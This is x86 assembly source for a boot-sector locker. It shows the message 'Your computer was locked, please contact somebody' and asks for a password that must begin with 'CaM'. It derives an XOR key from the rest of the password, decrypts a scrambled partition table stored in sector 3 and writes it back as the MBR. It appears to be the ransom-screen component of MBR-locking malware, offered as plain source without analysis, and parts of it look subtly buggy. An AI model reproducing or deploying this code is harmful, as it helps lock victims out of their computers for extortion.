; password must start with Cam in case misuse of password
org 0x7c00		; program will be load to this position, BIOS specified
start:
 mov ax,cs    ; point to code segment
 mov ds,ax
 mov ss,ax
 mov es,ax
 mov sp,0x100   ; open 100 byte stack space

 main:
    mov bp,Tips
    mov cx,Tips_Len
    mov ax,0x1301
    mov bx,0x0c
    mov dl,0
    int 0x10    ; call BIOS print service
    ; verfy password
    mov ax,0xb800 ; buffer
    add ax,0xA0
    mov ds,ax
    xor cx,cx
    xor bx,bx

    GetChar: ; get user input
        xor ax,ax
        int 0x16        ; keyboard int
        cmp AL,0x8      ; back key
        je back
        CMP al,0x0d     ; enter key, input finish
        je entry
        mov ah,2        ; other key consider as password
        mov [bx],al
        mov [bx+1],ah
        xor al,al
        mov [bx+2],al
        add bx,2
        inc cx                  ; keep password count
        mov [cs:InputCnt],cx    ; keep password count
    jmp GetChar

    back:
        sub bx,2
        dec cx
        mov [cs:InputCnt],cx    ; keep password count
        xor ax,ax
        mov [bx],ax
        jmp GetChar

    entry:
        ; compare password
        mov ax,cs
        mov es,ax
        xor bx,bx

        mov al,[ds:bx]          ; check if password prefix is CaM
        cmp al,'C'
        jne key_err
        add bx,2
        mov al,[ds:bx]
        cmp al,'a'
        jne key_err
        add bx,2
        mov al,[ds:bx]
        cmp al,'M'
        jne key_err
        add bx,2

        mov cl,0xff
        mov ch,0
        mov [cs:XResult],ch
    calc_key:
        mov al,[ds:bx]      ; get real password
        cmp al,0
        je fixmbr
        xor [cs:XResult],al
        add bx,2
    loop calc_key
    ; password verified, go to fix mbr
    fixmbr:
        mov ax,0x7e00
        mov es,ax
        xor bx,bx
        mov ah,0x2              ; function number, read
        mov dl,0x80             ; driver number
        mov al,1                ; sector count to read
        mov dh,0                ; magnetic head number 
        mov ch,0                ; cylinder number
        mov cl,3                ; sector number
        int 0x13                ; read file
        ; rewrite mbr
        mov bx,0x01bd           ; clear 445 byte flag
        xor ch,ch
        mov [es:bx],ch
        mov bx,0x01be           ; from 446 byte loop 64 bytes
        mov cl,64
    decrypt:
        mov al,[es:bx]
        xor al,[cs:XResult]
        mov [es:bx],al
        inc bx
    loop decrypt
    ; write back
    xor bx,bx
    mov ah,0x3                  ; function number, write
    mov dl,0x80
    mov al,1
    mov dh,0
    mov ch,0
    mov cl,1
    int 0x13                    ; write file
    jmp _REST   ; restart computer

    key_err:
        mov bx,0xb800
        add bx,Tips_Len
        mov al,'X'
        mov [bx],al
        mov cx,[cs:InputCnt]
        xor ax,ax
        kk:     ; clear input
        mov [bx],ax
        add bx,2
        loop kk
        jmp start

    _REST:
        mov ax,0xffff
        push ax
        mov ax,0
        push ax
        retf

data:
XResult:db 0
InputCnt:db 0
Tips: db "Your computer was locked, please contact somebody"
Tips_Len equ $-Tips
times 510-($-$$) db 0xF
dw 0xAA55